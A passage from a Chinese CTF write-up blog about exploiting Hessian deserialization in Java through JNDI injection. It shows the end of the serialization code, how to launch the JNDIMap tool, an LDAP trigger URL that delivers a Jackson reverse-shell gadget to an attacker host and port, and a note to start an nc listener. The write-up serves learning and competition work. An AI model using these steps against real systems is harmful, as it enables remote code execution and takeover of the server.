+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>serialize</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>HessianFactory</span><span class=p>.</span><span class=na>serialize</span><span class=p>(</span><span class=n>treeMap</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HessianFactory</span><span class=p>.</span><span class=na>deserialize</span><span class=p>(</span><span class=n>serialize</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>后面就是jndi注入，这里可以选择打jackson+springaop这条原生链反弹shell,利用jndimap起个服务反弹shell，或者用java-chains二次反序列化打内存马也行</p><p>之前一直没打明白，现在记录一下jndimap这玩意的用法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@iZgw05z0rnhp390rdoq7z7Z:~# java -jar JNDIMap-0.0.3.jar
+</span></span><span class=line><span class=cl><span class=o>[</span>RMI<span class=o>]</span> Listening on 127.0.0.1:1099
+</span></span><span class=line><span class=cl><span class=o>[</span>HTTP<span class=o>]</span> Listening on 127.0.0.1:3456
+</span></span><span class=line><span class=cl><span class=o>[</span>LDAP<span class=o>]</span> Listening on 127.0.0.1:1389
+</span></span></code></pre></td></tr></table></div></div><p>然后触发点填入<code>ldap://xxx:1389/Deserialize/Jackson/ReverseShell/xxx/4444</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>LDAP<span class=o>]</span> Received query: /Deserialize/Jackson/ReverseShell/xxx/4444
+</span></span><span class=line><span class=cl><span class=o>[</span>Deserialize<span class=o>]</span> <span class=o>[</span>Jackson<span class=o>]</span> <span class=o>[</span>ReverseShell<span class=o>]</span> Host: xxx Port: <span class=m>4444</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>LDAP<span class=o>]</span> Sending serialized gadget
+</span></span></code></pre></td></tr></table></div></div><p>出现这个就成了，另一边要同时起nc监听</p></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a>
+<a href=/tags/java/>Java</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under 9u_l3</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/%E5%BC%BA%E7%BD%91s9ruoyiwp/><div class=article-image><img src=/p/%E5%BC%BA%E7%BD%91s9ruoyiwp/1_hu_ea44ac63b991df40.b3c6f4e1239fa725af39b5c89822b39f.webp width=250 height=150 loading=lazy decoding=async alt=文章封面：强网s9RuoYiwp data-hash="md5-s8b04SOfpyWvObXImCKznw=="></div><div class=article-details><h2 class=article-title>强网s9RuoYiwp</h2></div></a></article><article class=has-image><a href=/p/2026-ccb-final-wp/><div class=article-image><img src=/p/2026-ccb-final-wp/1_hu_483f80f47576428c.fcb28b1e63cf29c31194f135c9a4bab5.webp width=250 height=150 loading=lazy decoding=async alt="文章封面：2026 ccb final wp" data-hash="md5-/LKLHmPPKcMRlPE1yaS6tQ=="></div><div class=article-details><h2 class=article-title>2026 ccb final wp</h2></div></a></article><article class=has-image><a href=/p/2026%E7%BA%A2%E6%98%8E%E8%B0%B7finalwp/><div class=article-image><img src=/p/2026%E7%BA%A2%E6%98%8E%E8%B0%B7finalwp/1_hu_ce9db8508488b2e.9c26ba64ec9487596c3d3e4d41cc4cec.webp width=250 height=150 loading=lazy decoding=async alt=文章封面：2026红明谷finalwp data-hash="md5-nCa6ZOyUh1lsPT5NQcxM7A=="></div><div class=article-details><h2 class=article-title>2026红明谷finalwp</h2></div></a></article><article class=has-image><a href=/p/2026polarisctf%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/><div class=article-image><img src=/p/2026polarisctf%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/1_hu_105d1d02beecec33.fbe1f5ed8fdd013ec9e206f7b0de3db8.webp width=250 height=150 loading=lazy decoding=async alt=文章封面：2026PolarisCTF出题小记 data-hash="md5-++H17Y/dAT7J4gb3sN49uA=="></div><div class=article-details><h2 class=article-title>2026PolarisCTF出题小记</h2></div></a></article><article class=has-image><a href=/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/><div class=article-image><img src=/p/2026ccbciscn%E5%8D%8A%E5%86%B3%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/1_hu_f33c6c4c8e7601e.bfbd2a4c18c7cd7ddf77aba9d8ca88d5.webp width=250 height=150 loading=lazy decoding=async alt=文章封面：2026ccb&amp;ciscn半决经验总结 data-hash="md5-v70qTBjHzX3fd6up2MqI1Q=="></div><div class=article-details><h2 class=article-title>2026ccb&amp;ciscn半决经验总结</h2></div></a></article></div></div></aside><script src=//unpkg.com/@waline/client@v2/dist/waline.js></script><link href=//unpkg.com/@waline/client@v2/dist/waline.css rel=stylesheet><div id=waline class=waline-container></div><style>.waline-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding);--waline-font-size:var(--article-font-size)}.waline-container .wl-count{color:var(--card-text-color-main)}</style><script>Waline.init({dark:'html[data-scheme="dark"]',el:"#waline",emoji:["https://unpkg.com/@waline/emojis@1.0.1/weibo"],locale:{admin:"Admin",placeholder:null},requiredMeta:["name","email","url"],serverURL:"https://waline-test-one-smoky.vercel.app"})</script><footer class=site-footer><section class=copyright>&copy;
+2025 -
+2026 无敌可爱美咕噜</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c1359695076787b3e6c2c57e9020904701cc696d5767c0ab1e455ca7031aae69.js defer></script><script type=text/javascript src=/ts/custom.21fb9193a315382e5c9cc70d4be76a78390116b15319b875de205795ecf99ac9.js defer></script><script>const cdnPath="https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd",cssPath="https://0d000721999.github.io/waifu/waifu.css",config={path:{homePath:"/",modelPath:cdnPath+"/Resources/",cssPath,tipsJsonPath:cdnPath+"/waifu-tips.json",tipsJsPath:cdnPath+"/waifu-tips.js",live2dCorePath:cdnPath+"/Core/live2dcubismcore.js",live2dSdkPath:cdnPath+"/live2d-sdk.js"},tools:["hitokoto","asteroids","express","photo","quit"],drag:{enable:!0,direction:["x","y"]},switchType:"order"};screen.width>=768&&Promise.all([loadExternalResource(config.path.cssPath,"css"),loadExternalResource(config.path.live2dCorePath,"js"),loadExternalResource(config.path.live2dSdkPath,"js"),loadExternalResource(config.path.tipsJsPath,"js")]).then(()=>{initWidget({waifuPath:config.path.tipsJsonPath,cdnPath:config.path.modelPath,tools:config.tools,dragEnable:config.drag.enable,dragDirection:config.drag.direction,switchType:config.switchType})});function loadExternalResource(e,t){return new Promise((n,s)=>{let o;t==="css"?(o=document.createElement("link"),o.rel="stylesheet",o.href=e):t==="js"&&(o=document.createElement("script"),o.src=e),o&&(o.onload=()=>n(e),o.onerror=()=>s(e),document.head.appendChild(o))})}</script></body></html>
